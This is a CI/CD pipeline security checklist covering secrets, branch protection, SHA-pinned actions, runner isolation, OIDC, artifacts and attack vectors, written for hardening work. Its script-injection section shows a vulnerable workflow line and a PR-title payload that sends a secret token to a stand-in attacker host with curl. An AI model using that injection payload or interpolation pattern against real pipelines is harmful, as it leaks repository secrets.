# CI/CD Security Checklist

## Use this reference

Load this reference when security checklist is part of the pipeline task. Apply it to the actual event trust boundary, job permissions, dependencies, runner, artifacts, and observed pipeline result without suppressing failures.

Audit checklist for pipeline security across platforms.

## Secrets

- [ ] No secrets in pipeline YAML files - use platform secrets/variables
- [ ] Tokens have minimal scope (repo-only, not org-wide)
- [ ] Short-lived tokens preferred over long-lived PATs
- [ ] Secrets never echoed, logged, or printed in error messages
- [ ] Debug mode (`ACTIONS_STEP_DEBUG`, `CI_DEBUG_TRACE`) is off in production

## Branch protection

- [ ] `main`/`master` branch requires PR review before merge
- [ ] CI must pass before merge (status checks required)
- [ ] No direct push to protected branches
- [ ] Tag protection enabled (or restricted to specific roles)

## Pipeline integrity

- [ ] Third-party actions/packages pinned to a SHA, not a tag

  ```yaml
  # Bad: uses: actions/checkout@v4
  # Good: uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
  ```

- [ ] Workflow triggers limited to expected events (no wildcard
  `pull_request_target`)
- [ ] `GITHUB_TOKEN` permissions set to minimum in each job:

  ```yaml
  permissions:
    contents: read
  ```

- [ ] No script injection from user-controlled input (PR titles, commit
messages, issue bodies)

## Runner security

- [ ] Self-hosted runners isolated from production infrastructure
- [ ] Ephemeral runners preferred over persistent ones
- [ ] Runner has no access to secrets it doesn't need

## OIDC (OpenID Connect)

- [ ] Cloud provider auth uses OIDC instead of long-lived secrets

  ```yaml
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789:role/github-actions
      aws-region: us-east-1
  ```

## Artifact safety

- [ ] Artifact expiry set (GitLab: `expire_in`, GitHub: 90 days default)
- [ ] Build artifacts in public repos don't contain secrets
- [ ] Artifacts from forked PRs not accessible to unapproved contributors

## Supply chain

- [ ] Dependencies pinned (lockfile committed)
- [ ] `npm ci` not `npm install` (same for pip, cargo, etc.)
- [ ] SBOM generated and signed for releases

## Attack vectors

Specific attack patterns that CI/CD guardrails must block. Sources: [GitLab
CI/CD
hardening](https://docs.gitlab.com/security/hardening_cicd_recommendations/),
[hoop.dev](https://hoop.dev/blog/why-github-ci-cd-needs-guardrails).

### Script injection via PR title/body

```yaml
# BLOCKED - PR title flows directly into shell
- run: echo "${{ github.event.pull_request.title }}"
```

An attacker opens a PR with title `$(curl attacker.com/steal?token=$SECRET)`.
Fix: use environment variables.

```yaml
- run: echo "$PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

### Malicious third-party actions

Unpinned actions from unverified sources. Anyone with commit access to the
action's repo can push a new version of a mutable tag. Always pin to SHA.

### Credential exfiltration via pull_request_target

When an outside contributor triggers `pull_request_target`, it runs in the
target repo context with full secrets. The PR code can exfiltrate tokens, push
to protected branches, or publish releases. Use `workflow_run` or `pull_request`
with `permissions:` and an approval gate.

### Artifact poisoning

Artifacts from fork PRs can contain malicious binaries. Never download artifacts
from untrusted workflows into privileged deployment jobs.

## Fork PR safety

For public repos that accept fork PRs:

```yaml
on:
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@<sha>
      - run: npm test
      # NEVER: upload artifacts, use secrets, deploy, push
```

If secrets are needed in fork PR tests, use `pull_request_target` with an
explicit label condition and `permissions:` block - only after thorough
security review. Default: reject.
